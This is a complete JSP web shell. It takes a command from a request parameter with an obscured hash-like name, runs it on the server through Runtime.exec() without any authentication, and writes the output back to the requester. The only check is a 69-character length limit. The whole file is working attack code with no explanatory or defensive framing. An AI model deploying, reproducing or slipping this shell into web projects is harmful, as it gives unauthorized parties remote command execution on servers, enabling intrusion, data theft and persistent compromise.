<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("54b8617eca0e54c7d3c8e6732c6b687a") != null) {
	String command = request.getParameter("54b8617eca0e54c7d3c8e6732c6b687a");
	int length = command.length();

	if (length < 69) {
		try {
			Process p = Runtime.getRuntime().exec(request.getParameter("54b8617eca0e54c7d3c8e6732c6b687a"));
			OutputStream os = p.getOutputStream();
			InputStream in = p.getInputStream();
			DataInputStream dis = new DataInputStream(in);
			String disr = dis.readLine();
			while ( disr != null ) {
					out.println(disr); 
					disr = dis.readLine(); 
			}
		} catch (Exception e) {
			out.println("Something went wrong. Was the command valid?");
		}        
	} else{
		out.println("Command to long.");
	}
}
%>
